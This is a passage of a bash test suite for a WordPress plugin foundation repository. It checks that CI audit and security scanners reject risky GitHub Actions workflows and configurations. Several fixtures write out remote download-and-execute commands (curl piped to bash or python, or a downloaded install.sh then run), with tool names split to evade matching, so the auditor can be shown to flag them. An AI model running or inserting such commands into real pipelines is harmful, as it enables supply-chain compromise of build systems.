composite_remote_script_shell='ba''sh'
composite_remote_script_command="cur""l -fsSL ${composite_remote_script_scheme}${composite_remote_script_separator}${composite_remote_script_target} | ${composite_remote_script_shell}"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<EOF
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: ${composite_remote_script_command}
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a composite action remote script payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
name: test-action
runs:
  using: node20
  main: index.js
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a non-composite local action." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: node index.js
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a composite action that dispatches to a local helper script." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: source ./helper.sh
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a composite action that sources a local helper script." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  lint:
    permissions:
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if ! bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly failed for a valid custom workflow." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: |
          curl -fsSL https://github.com/example/install.sh -o /tmp/install.sh
          bash /tmp/install.sh
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a multiline download-then-execute payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows" "$audit_fixture/scripts"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: bash scripts/test.sh
EOF

script_download_scheme='https'
script_download_separator='://'
script_download_target='github.com/example/install.sh'
cat > "$audit_fixture/scripts/test.sh" <<EOF
cur''l -fsSL ${script_download_scheme}${script_download_separator}${script_download_target} -o /tmp/install.sh
bash /tmp/install.sh
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a multiline download-then-execute shell script." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

dynamic_scheme='https'
dynamic_separator='://'
dynamic_host='example.com'
dynamic_path='payload.py'
dynamic_interpreter='py''thon'
printf '      - run: |\n' >> "$audit_fixture/.github/workflows/ci.yml"
printf '          scheme=%s\n' "$dynamic_scheme" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          host=%s\n' "$dynamic_host" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          path_part=%s\n' "$dynamic_path" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          url="${scheme}%s${host}/${path_part}"\n' "$dynamic_separator" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          cur''l -fsSL "$url" | %s\n' "$dynamic_interpreter" >> "$audit_fixture/.github/workflows/ci.yml"

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a dynamic remote script payload piped to python." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yaml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a .yaml workflow file." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
extra_url_scheme='https'
extra_url_separator='://'
extra_url_host='raw.githubusercontent.com'
extra_url_path='example/repo/main/file.txt'
extra_url="${extra_url_scheme}${extra_url_separator}${extra_url_host}/${extra_url_path}"

cat > "$audit_fixture/.github/workflows/ci.yml" <<EOF
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: echo "$extra_url"
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a non-allowlisted host." >&2
  exit 1
fi

if ! EXTRA_ALLOWED_HOSTS='raw.githubusercontent.com' bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly failed when EXTRA_ALLOWED_HOSTS included the host." >&2
  exit 1
fi

authorization_fixture="$(mktemp -d)"
mkdir -p "$authorization_fixture/includes"
cat > "$authorization_fixture/.wp-plugin-base.env" <<'EOF'
WORDPRESS_SECURITY_PACK_ENABLED=true
EOF

cat > "$authorization_fixture/includes/public-endpoints.php" <<'EOF'
<?php
add_action( 'wp_ajax_nopriv_my_public_action', 'my_public_handler' );
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly passed without a suppression." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_public",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": "Intentional public endpoint."
    }
  ]
}
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly accepted an invalid suppression kind." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": ""
    }
  ]
}
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly passed with an empty suppression justification." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": "Public endpoint is required for unauthenticated preflight and only returns nonce-gated non-sensitive metadata."
    }
  ]
}
EOF

if ! WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly failed with a justified suppression." >&2
  exit 1
fi

deploy_protection_fixture="$(mktemp -d)"
cat > "$deploy_protection_fixture/.wp-plugin-base.env" <<'EOF'
WP_ORG_DEPLOY_ENABLED=true
PRODUCTION_ENVIRONMENT=production
EOF

if ! WP_PLUGIN_BASE_ROOT="$deploy_protection_fixture" bash "$ROOT_DIR/scripts/ci/check_deploy_environment_protection.sh" >/dev/null 2>&1; then
  echo "Deploy environment protection check unexpectedly failed in non-strict mode." >&2
  exit 1
fi

if WP_PLUGIN_BASE_ROOT="$deploy_protection_fixture" bash "$ROOT_DIR/scripts/ci/check_deploy_environment_protection.sh" --strict >/dev/null 2>&1; then
  echo "Deploy environment protection check unexpectedly passed in strict mode without GitHub environment context." >&2
  exit 1
fi

deploy_local_project_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$deploy_local_project_fixture/"
mkdir -p "$deploy_local_project_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$deploy_local_project_fixture/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
if ! env -u GITHUB_ACTIONS -u GITHUB_REPOSITORY -u GH_TOKEN -u GITHUB_TOKEN \
  WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" \
  bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "release/1.2.3" >/dev/null 2>&1; then
  echo "Project validation unexpectedly failed locally for a deploy-enabled project." >&2
  exit 1
fi

if GITHUB_ACTIONS=true GITHUB_REPOSITORY=example/repo WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "release/1.2.3" >/dev/null 2>&1; then
  echo "Project validation unexpectedly passed in strict GitHub mode without deploy environment access." >&2
  exit 1
fi

zip_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$zip_fixture/"
mkdir -p "$zip_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$zip_fixture/.wp-plugin-base/"
perl -0pi -e 's/^ZIP_FILE=.*/ZIP_FILE=..\/outside.zip/m' "$zip_fixture/.wp-plugin-base.env"

if WP_PLUGIN_BASE_ROOT="$zip_fixture" bash "$ROOT_DIR/scripts/ci/validate_config.sh" >/dev/null 2>&1; then
  echo "Config validation unexpectedly accepted an escaping ZIP_FILE." >&2
  exit 1
fi

rm -rf "$zip_fixture"

pr_stage_fixture="$(mktemp -d)"
pr_stage_origin="$(mktemp -d)"
git init --bare -q "$pr_stage_origin"
git -C "$pr_stage_fixture" init -q
git -C "$pr_stage_fixture" config user.email "fixture@example.com"
git -C "$pr_stage_fixture" config user.name "Fixture"
mkdir -p "$pr_stage_fixture/.security"
mkdir -p "$pr_stage_fixture/.wp-plugin-base-security-pack"
cat > "$pr_stage_fixture/.wp-plugin-base-security-pack/composer.json" <<'EOF'
{"name":"fixture/security-pack"}
EOF
cat > "$pr_stage_fixture/.phpcs-security.xml.dist" <<'EOF'
<ruleset name="fixture-security"/>
EOF
cat > "$pr_stage_fixture/.phpcs.xml.dist" <<'EOF'
<ruleset name="fixture-quality"/>
EOF
cat > "$pr_stage_fixture/.security/custom-security-suppressions.json" <<'EOF'
{"suppressions":[]}
EOF
git -C "$pr_stage_fixture" add \
  .wp-plugin-base-security-pack/composer.json \
  .phpcs-security.xml.dist \
  .phpcs.xml.dist \
  .security/custom-security-suppressions.json
git -C "$pr_stage_fixture" commit -qm "init"
git -C "$pr_stage_fixture" branch -M main
git -C "$pr_stage_fixture" remote add origin "$pr_stage_origin"
git -C "$pr_stage_fixture" push -q -u origin main
rm -rf "$pr_stage_fixture/.wp-plugin-base-security-pack"
rm -f "$pr_stage_fixture/.phpcs-security.xml.dist" "$pr_stage_fixture/.phpcs.xml.dist"
rm -f "$pr_stage_fixture/.security/custom-security-suppressions.json"
cat > "$pr_stage_fixture/body.md" <<'EOF'
fixture body
EOF
mkdir -p "$pr_stage_fixture/bin"
cat > "$pr_stage_fixture/bin/gh" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "pr" ] && [ "$2" = "list" ]; then
  echo '[]'
  exit 0
fi
if [ "$1" = "pr" ] && [ "$2" = "create" ]; then
  echo 'https://github.com/example/repo/pull/1'
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$pr_stage_fixture/bin/gh"
pr_stage_output="$(mktemp)"
(
  cd "$pr_stage_fixture"
  PATH="$pr_stage_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_stage_output" \
    GIT_ADD_PATHS=".wp-plugin-base-security-pack,.phpcs-security.xml.dist,.phpcs.xml.dist,.security/custom-security-suppressions.json" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/fixture-removal" \
      "main" \
      "fixture removal" \
      "fixture removal" \
      "$pr_stage_fixture/body.md"
)
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.wp-plugin-base-security-pack/composer.json'; then
  echo "Explicit path staging unexpectedly failed to commit a managed deletion." >&2
  exit 1
fi
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.phpcs-security.xml.dist'; then
  echo "Explicit path staging unexpectedly failed to commit a managed root-file deletion." >&2
  exit 1
fi
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.phpcs.xml.dist'; then
  echo "Explicit path staging unexpectedly failed to commit a managed quality-file deletion." >&2
  exit 1
fi
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.security/custom-security-suppressions.json'; then
  echo "Explicit path staging unexpectedly failed to commit a configured suppressions-file deletion." >&2
  exit 1
fi

forbidden_fixture="$(mktemp -d)"
trap 'rm -rf "$managed_child" "$managed_security_child" "$audit_fixture" "$zip_fixture" "$forbidden_fixture" "$authorization_fixture" "$deploy_protection_fixture" "$deploy_local_project_fixture" "$plugin_check_release_fixture" "$plugin_check_resolve_output" "$foundation_release_fixture" "$foundation_resolve_output" "$foundation_verify_fixture" "$foundation_verify_output" "$foundation_verify_verify_script" "$foundation_verify_release_json" "$foundation_verify_tag_ref_json" "$foundation_verify_compare_json" "$foundation_verify_pulls_json" "$foundation_verify_metadata_json" "$foundation_verify_sigstore_json" "$pr_stage_fixture" "$pr_stage_origin" "$pr_stage_output"' EXIT
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$forbidden_fixture/"
mkdir -p "$forbidden_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$forbidden_fixture/.wp-plugin-base/"
touch "$forbidden_fixture/.DS_Store"
if WP_PLUGIN_BASE_ROOT="$forbidden_fixture" bash "$ROOT_DIR/scripts/ci/check_forbidden_files.sh" >/dev/null 2>&1; then
  echo "Forbidden file policy unexpectedly accepted .DS_Store." >&2
  exit 1
fi

echo "Validated foundation repository at $ROOT_DIR"
